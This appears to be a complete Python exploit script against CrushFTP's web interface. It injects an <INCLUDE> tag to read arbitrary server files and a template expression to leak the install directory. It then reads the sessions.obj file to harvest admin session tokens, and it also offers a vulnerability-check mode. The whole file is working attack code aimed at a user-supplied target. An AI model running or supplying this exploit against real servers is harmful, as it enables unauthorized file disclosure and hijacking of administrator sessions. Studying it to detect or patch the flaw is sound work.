#!/usr/bin/env python3

import requests
import argparse
import sys
import re
import os

def find_session_tokens():
    """Reads and extracts unique session tokens from 'sessions.obj'."""
    with open('sessions.obj', 'r') as file:
        content = file.read()
    pattern = r'\d{13}_[a-zA-Z0-9]{30}'
    matches = re.findall(pattern, content)
    return list(set(matches))

def get_cookies(url):
    """Retrieve session cookies from the CrushFTP server."""
    response = requests.post(f"{url}/WebInterface/")
    if "CrushAuth" in response.cookies:
        return response.cookies
    raise ValueError("CrushAuth cookie not found. Authentication failed.")

def read_file(url, cookies, file_path, save=False):
    """Send a request to read a file from the CrushFTP server using the given path."""
    print(f"Reading file: {file_path}")
    payload = {
        "command": "exists",
        "paths": f"<INCLUDE>{file_path}</INCLUDE>",
        "c2f": cookies['currentAuth']
    }
    response = requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookies)
    
    if save:
        with open('sessions.obj', 'w') as file:
            file.write(response.text)

    return response.text

def get_template_value(url, cookies, template):
    """Send a request to retrieve a value using a server template."""
    payload = {
        "c2f": cookies['currentAuth'],
        "command": "zip",
        "path": f"{{{template}}}",
        "names": "any"
    }
    return requests.post(f"{url}/WebInterface/function/", data=payload, cookies=cookies).text

def extract_file_content(xml_response):
    """Extract the actual content from the XML response using regular expressions."""
    match = re.search(r'<response>([^*]*):', xml_response)
    if match:
        return match.group(1).strip()
    raise ValueError("Unable to extract content from response.")

def main():
    parser = argparse.ArgumentParser(description="Exploit script for CrushFTP File Read Vulnerability")
    parser.add_argument("-t", "--target", required=True, help="URL of the target CrushFTP server")
    parser.add_argument("-r", "--readfile", help="Path of the file to read from the server")
    parser.add_argument("-s", "--get-session", action='store_true', help="Retrieve an admin session from the server")
    parser.add_argument("-c", "--check", action='store_true', help="Perform a vulnerability check")
    args = parser.parse_args()

    try:
        cookies = get_cookies(args.target)

        if args.readfile:
            content = read_file(args.target, cookies, args.readfile)
            if '<INCLUDE>' in content:
                print(f"The file does not exist or is not accessible by CrushFTP.")
            else:
                print("Extracted Content:\n\n" + extract_file_content(content))
        
        if args.get_session:
            print("Trying to obtain admin token and getting target's install location.")
            install_dir = get_template_value(args.target, cookies, "working_dir").split(":")[2].split("\n")[0].strip()
            print("Install dir obtained: " + install_dir)
            obj_file_location = os.path.join(install_dir, 'sessions.obj')
            obj_content = read_file(args.target, cookies, obj_file_location, save=True)
            if '<commandResult>' not in obj_content:
                print("The obj file does not exist or is not accessible by CrushFTP.")
            else:
                print("Found session tokens:")
                for token in find_session_tokens():
                    print('   ' + token)

        if args.check:
            content = read_file(args.target, cookies, 'users/MainUsers/groups.XML')
            if '<groups' in content:
                print("The CrushFTP instance seems to be VULNERABLE.")
            else:
                print("The CrushFTP instance seems to be NOT VULNERABLE.")
                
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    sys.exit(main())
